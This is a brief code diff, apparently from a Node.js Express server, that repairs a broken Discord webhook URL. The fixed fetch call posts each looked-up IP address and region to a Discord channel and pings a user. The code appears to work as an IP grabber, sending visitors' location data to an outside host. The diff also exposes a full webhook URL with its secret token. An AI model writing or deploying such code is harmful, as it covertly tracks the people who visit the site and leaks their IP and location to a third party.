@@ -9,7 +9,7 @@ express()
         return res.status(500).send("Server error: failed to get IP info");
       }
 
-      await fetch("https://discord.com/api/webhooks/1467036747832758334/_https://discord.com/api/webhooks/1467086114245574657/q8IPAwByCouW4LJ_uwbbtsT1X8zJ9vdYA-6dmClQFhHiLxWFe6UZ5Gm9FjdDy8FI9qnf", {
+      await fetch("https://discord.com/api/webhooks/1467086114245574657/q8IPAwByCouW4LJ_uwbbtsT1X8zJ9vdYA-6dmClQFhHiLxWFe6UZ5Gm9FjdDy8FI9qnf", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ content: `${got.ip} ${got.region} <@1238820524256268381>` })
